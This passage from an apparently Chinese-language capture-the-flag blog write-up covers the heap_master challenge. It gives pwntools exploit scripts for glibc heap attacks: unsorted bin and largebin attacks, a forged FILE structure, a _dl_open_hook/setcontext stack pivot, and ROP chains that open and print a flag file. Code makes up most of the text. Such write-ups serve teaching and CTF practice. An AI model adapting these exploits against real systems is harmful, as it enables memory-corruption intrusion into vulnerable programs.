class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>)) </span><br><span class="line">free(<span class="number">0x10</span>) <span class="comment">#free完后，fd&amp;bk-&gt;dl_open_hook</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line">edit(<span class="number">0x18</span>, p64(addr_libc_stdout+<span class="number">0x68</span><span class="number">-0x10</span>))<span class="comment"># bk-&gt;stdout+0x68(chain)</span></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x191</span>))</span><br><span class="line">edit(<span class="number">0x198</span>, p64(<span class="number">0x11</span>)) <span class="comment">#main_arena + 0x68（chain)-&gt;mmap</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fake_file  = <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line"><span class="comment"># fake_file += p64((addr_stack-0x2000 - 0x64)/2 + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_file  = fake_file.ljust(<span class="number">0x40</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p64((addr_stack <span class="number">-0x2100</span>- <span class="number">0x64</span>)/<span class="number">2</span>)</span><br><span class="line">fake_file  = fake_file.ljust(<span class="number">0xd8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">fake_file += p64(addr_libc_io_str_jumps)</span><br><span class="line">fake_file += p64(addr_libc_gets)</span><br><span class="line">edit(<span class="number">0</span>, fake_file)</span><br><span class="line">gdb.attach(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">rop = ROP(libc)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x100</span>, <span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">rop.open(addr_buf_base + <span class="number">0x100</span>, <span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>, addr_buf_base + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line">rop.write(constants.STDOUT_FILENO, addr_buf_base + <span class="number">0x200</span>, <span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">print</span> hex(rop.ret.address)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'0'</span>)</span><br><span class="line">p.sendline(p64(rop.ret.address)*<span class="number">0x500</span>+str(rop))<span class="comment">#任意填充一直ret到rop的位置</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="方法二：largebin-attack-amp-dl-open-hook"><a href="#方法二：largebin-attack-amp-dl-open-hook" class="headerlink" title="方法二：largebin attack &amp; dl_open_hook"></a>方法二：largebin attack &amp; dl_open_hook</h4><p>发现它要getshell貌似一定要改glibc的版本，因为给的libc是2.25的</p>
<p>本来想用unsorted bin attack + global_max_fast来做的，但是发现fastbin attack的话好像就没办法把mmap的地址填进dl_open_hook达到对mmap段的利用（我太菜了</p>
<p>那就用largebin attack吧，方便一点</p>
<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p><a href="https://ama2in9.top/2020/01/02/heap_master/" target="_blank" rel="noopener">https://ama2in9.top/2020/01/02/heap_master/</a><br><a href="https://www.lyyl.online/2020/07/14/starctf-2019-WP/" target="_blank" rel="noopener">https://www.lyyl.online/2020/07/14/starctf-2019-WP/</a><br><a href="http://pollux.cc/2019/05/04/2019-sixstarsCTF-heap_master/#0x01-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90" target="_blank" rel="noopener">http://pollux.cc/2019/05/04/2019-sixstarsCTF-heap_master/#0x01-%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90</a><br><a href="https://paper.seebug.org/935/#3-largebin-attack-_dl_open_hook" target="_blank" rel="noopener">https://paper.seebug.org/935/#3-largebin-attack-_dl_open_hook</a></p>
<h5 id="关于dl-open-hook"><a href="#关于dl-open-hook" class="headerlink" title="关于dl_open_hook"></a>关于dl_open_hook</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc 2.23   elf/dl-libc.c : 111</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dl_open_hook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *(*dlopen_mode) (<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> mode);</span><br><span class="line">  <span class="keyword">void</span> *(*dlsym) (<span class="keyword">void</span> *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">char</span> *name);</span><br><span class="line">  <span class="keyword">int</span> (*dlclose) (<span class="keyword">void</span> *<span class="built_in">map</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们调试的时候可以发现，在报错时会把dl_open_hook里的值放进rax中（用官方的libc环境是rbx,但是我没更换到）所以要找到可利用的gadget，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a7a99a</span> &lt;_IO_new_fgetpos+<span class="number">170</span>&gt;:   mov    rdi,rax</span><br><span class="line"><span class="number">0x7ffff7a7a99d</span> &lt;_IO_new_fgetpos+<span class="number">173</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x20</span>]</span><br></pre></td></tr></table></figure>

<p>基本上就是rax那些指针的bug的感觉了，syscall好像call不了，不知道为啥</p>
<p>然后在rax(mmap段地址在执行libc_dlopen_mode的时候会被放到rax里面）+0x20的位置放setcontext+53的地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a54b85</span> &lt;setcontext+<span class="number">53</span>&gt;:	mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b8c</span> &lt;setcontext+<span class="number">60</span>&gt;:	mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b93</span> &lt;setcontext+<span class="number">67</span>&gt;:	mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b97</span> &lt;setcontext+<span class="number">71</span>&gt;:	mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b9b</span> &lt;setcontext+<span class="number">75</span>&gt;:	mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x7ffff7a54b9f</span> &lt;setcontext+<span class="number">79</span>&gt;:	mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0x7ffff7a54ba3</span> &lt;setcontext+<span class="number">83</span>&gt;:	mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br></pre></td></tr></table></figure>

<p>控制rsp为我们填写rop的位置，实现rop的利用</p>
<p>调试exp(就是syscall会crash掉，不知道为啥)</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(off,cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(cont)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(off)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x108</span>,p64(<span class="number">0x401</span>))      <span class="comment">#fake first large chunk</span></span><br><span class="line">    edit(<span class="number">0x508</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x528</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x110</span>)</span><br><span class="line">    add(<span class="number">0x400</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0x608</span>,p64(<span class="number">0x411</span>))</span><br><span class="line">    edit(<span class="number">0x608</span>+<span class="number">0x410</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x608</span>+<span class="number">0x430</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x610</span>  )</span><br><span class="line">    edit(<span class="number">0x118</span>,p16(<span class="number">0x2610</span>))     <span class="comment">#modify stdout_flag --&gt; mmap_addr</span></span><br><span class="line">    edit(<span class="number">0x128</span>,p16(<span class="number">0x2629</span>))</span><br><span class="line">    <span class="comment"># delete(0x610)</span></span><br><span class="line">    add(<span class="number">0x410</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0x1008</span>,p64(<span class="number">0x451</span>))     <span class="comment">#fake second large chunk</span></span><br><span class="line">    edit(<span class="number">0x1458</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x1478</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x1010</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0x1508</span>,p64(<span class="number">0x461</span>))</span><br><span class="line">    edit(<span class="number">0x1968</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x1988</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x1510</span>)</span><br><span class="line">    edit(<span class="number">0x1018</span>,p16(<span class="number">0x2629</span>))    <span class="comment">#modify io_write_base_one_byte --&gt; '\x00'</span></span><br><span class="line">    add(<span class="number">0x460</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    data = p.recv(<span class="number">8</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">''</span> <span class="keyword">or</span> data[<span class="number">0</span>] == <span class="string">'='</span> :</span><br><span class="line">        <span class="keyword">raise</span> NameError</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    p.recv(<span class="number">24</span>)</span><br><span class="line">    data1 = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    data2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    heap_base = data1 - <span class="number">3584</span></span><br><span class="line">    libc_base = data2 - <span class="number">3954339</span></span><br><span class="line">    setcontext = libc_base + <span class="number">293749</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base),hex(libc_base)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2008</span>,p64(<span class="number">0x501</span>))</span><br><span class="line">    edit(<span class="number">0x2508</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x2528</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x2010</span>)</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2608</span>,p64(<span class="number">0x511</span>))</span><br><span class="line">    edit(<span class="number">0x2b18</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    edit(<span class="number">0x2b38</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">0x2610</span>)</span><br><span class="line">    edit(<span class="number">0x2018</span>,p16(<span class="number">0x62d0</span>))</span><br><span class="line">    add(<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    pop_rax = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">    pop_rsi = libc_base + <span class="number">0x00000000000202f8</span>  <span class="comment">#182c</span></span><br><span class="line">    pop_rdx = libc_base + <span class="number">0x0000000000001b92</span>  <span class="comment">#true</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x00000000000026bf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff7a7a99a &lt;_IO_new_fgetpos+170&gt;:   mov    rdi,rax</span></span><br><span class="line">    <span class="comment"># 0x7ffff7a7a99d &lt;_IO_new_fgetpos+173&gt;:    call   QWORD PTR [rax+0x20]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2600</span>,p64(libc_base+<span class="number">0x6D99A</span>))</span><br><span class="line">    edit(<span class="number">0x2620</span>,p64(setcontext+<span class="number">0x10</span>))</span><br><span class="line">    edit(<span class="number">0x26a0</span>,p64(heap_base+<span class="number">0x26b0</span>))</span><br><span class="line">    edit(<span class="number">0x26a8</span>,p64(libc_base+<span class="number">0x0000000000000937</span>)) <span class="comment">#ret</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x26b0</span>,p64(pop_rax))    <span class="comment">#read</span></span><br><span class="line">    edit(<span class="number">0x26b8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x26c0</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x26c8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x26d0</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x26d8</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x26e0</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x26e8</span>,p64(<span class="number">20</span>))</span><br><span class="line">    edit(<span class="number">0x26f0</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x26f8</span>,p64(pop_rax))    <span class="comment">#open</span></span><br><span class="line">    edit(<span class="number">0x2700</span>,p64(<span class="number">2</span>))</span><br><span class="line">    edit(<span class="number">0x2708</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x2710</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x2718</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x2720</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2728</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x2730</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2738</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2740</span>,p64(pop_rax))    <span class="comment">#read</span></span><br><span class="line">    edit(<span class="number">0x2748</span>,p64(<span class="number">0</span>))</span><br><span class="line">    edit(<span class="number">0x2750</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x2758</span>,p64(<span class="number">4</span>))</span><br><span class="line">    edit(<span class="number">0x2760</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x2768</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x2770</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x2778</span>,p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x2780</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0x2788</span>,p64(pop_rax))    <span class="comment">#write</span></span><br><span class="line">    edit(<span class="number">0x2790</span>,p64(<span class="number">1</span>))</span><br><span class="line">    edit(<span class="number">0x2798</span>,p64(pop_rdi))</span><br><span class="line">    edit(<span class="number">0x27a0</span>,p64(<span class="number">1</span>))</span><br><span class="line">    edit(<span class="number">0x27a8</span>,p64(pop_rsi))</span><br><span class="line">    edit(<span class="number">0x27b0</span>,p64(heap_base))</span><br><span class="line">    edit(<span class="number">0x27b8</span>,p64(pop_rdx))</span><br><span class="line">    edit(<span class="number">0x27c0</span>,p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">0x27c8</span>,p64(syscall))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0x2b20</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    delete(<span class="number">0x2b20</span>)</span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'./flag\x00'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span> :</span><br><span class="line">    pd = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> pd:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">            exp()</span><br><span class="line">            pd = <span class="number">0</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>打得通的大佬exp(就是由于要搞glibc的更换，所以没办法在gdb里看bin那些东西)：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> 